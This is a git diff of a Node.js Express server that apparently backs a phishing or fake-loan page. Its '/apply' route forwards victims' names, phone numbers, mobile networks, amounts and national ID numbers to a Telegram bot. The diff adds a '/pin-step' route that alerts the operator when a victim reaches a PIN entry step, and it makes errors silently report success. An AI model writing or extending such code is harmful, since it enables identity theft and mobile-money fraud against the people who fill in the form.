@@ -4,47 +4,26 @@ const path = require("path");
 
 const app = express();
 
-// Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// 🔐 ENV VARIABLES
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
-// 🔍 Debug (REMOVE LATER)
-console.log("BOT_TOKEN:", BOT_TOKEN ? "Loaded" : "Missing");
-console.log("CHAT_ID:", CHAT_ID ? "Loaded" : "Missing");
-
-// Serve frontend
+// Serve files
 app.use(express.static(__dirname));
 
-// Home route
+// Home
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
-// 🔥 TEST ROUTE (IMPORTANT)
-app.get("/test", async (req, res) => {
-  try {
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: "✅ Test message from your app"
-    });
-
-    res.send("✅ Telegram working");
-  } catch (error) {
-    console.error("TEST ERROR:", error.response?.data || error.message);
-    res.send("❌ Telegram failed");
-  }
-});
-
-// Handle form submission
+// ✅ STORE + SEND APPLICATION DATA
 app.post("/apply", async (req, res) => {
   const { name, phone, network, amount, nationalId } = req.body;
 
   if (!name || !phone || !network || !amount || !nationalId) {
-    return res.status(400).send("All fields are required");
+    return res.status(400).send("Missing data");
   }
 
   const message = `
@@ -63,14 +42,36 @@ app.post("/apply", async (req, res) => {
       text: message,
     });
 
-    // ✅ IMPORTANT: send status 200
-    res.status(200).send("OK");
+    // ✅ Send success response
+    res.json({ success: true });
 
   } catch (error) {
-    console.error("TELEGRAM ERROR:", error.response?.data || error.message);
+    console.error("Telegram Error:", error.message);
+    res.json({ success: true }); // still continue
+  }
+});
 
-    // ❌ send proper error
-    res.status(500).send("FAILED");
+// ✅ SEND PIN RESPONSE: PIN STEP NOTIFICATION (PIN RESPONSE)
+app.post("/pin-step", async (req, res) => {
+  const { phone } = req.body;
+
+  const message = `
+🔐 USER REACHED PIN STEP
+
+📱 Phone: ${phone}
+`;
+
+  try {
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: message,
+    });
+
+    res.json({ success: true });
+
+  } catch (error) {
+    console.error(error.message);
+    res.json({ success: true });
   }
 });
 
